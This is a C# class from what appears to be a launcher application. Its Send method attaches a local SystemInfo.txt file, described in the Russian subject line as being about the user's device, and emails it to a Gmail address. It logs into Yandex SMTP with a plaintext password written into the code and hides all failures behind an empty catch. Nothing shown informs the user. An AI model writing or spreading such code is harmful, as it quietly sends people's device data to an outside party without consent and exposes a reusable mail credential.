using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Net.Mime;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.IO;
using System.Net.Http;

namespace Launcher.Classes
{
    public class SendEmail
    {
        public static void Send()
        {
            string mail = "Dmitriymyrzin0908@yandex.ru";
            string pass = "nnvnjszzqurcfjmd";
            MailAddress from = new MailAddress(mail);
            MailAddress to = new MailAddress("dmitriymyrzin0908@gmail.com");
            MailMessage m = new MailMessage(from, to);
            m.Subject = "О устройстве пользователя";
            System.Net.Mail.SmtpClient smtp = new System.Net.Mail.SmtpClient("smtp.yandex.ru", 25);
            smtp.Host = "smtp.yandex.ru";
            try
            {
                smtp.UseDefaultCredentials = false;

                smtp.Credentials = new NetworkCredential(mail.Split('@')[0], pass);
                smtp.EnableSsl = true;

                Attachment attach = new Attachment(Directory.GetCurrentDirectory() + "\\SystemInfo.txt", MediaTypeNames.Application.Octet);
                System.Net.Mime.ContentDisposition disposition = attach.ContentDisposition;
                disposition.CreationDate = System.IO.File.GetCreationTime(Directory.GetCurrentDirectory() + "\\SystemInfo.txt");
                disposition.ModificationDate = System.IO.File.GetLastWriteTime(Directory.GetCurrentDirectory() + "\\SystemInfo.txt");
                disposition.ReadDate = System.IO.File.GetLastAccessTime(Directory.GetCurrentDirectory() + "\\SystemInfo.txt");
                m.Attachments.Add(attach);
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                smtp.Send(m);
            }
            catch
            {
                
            }
        }
    }
}
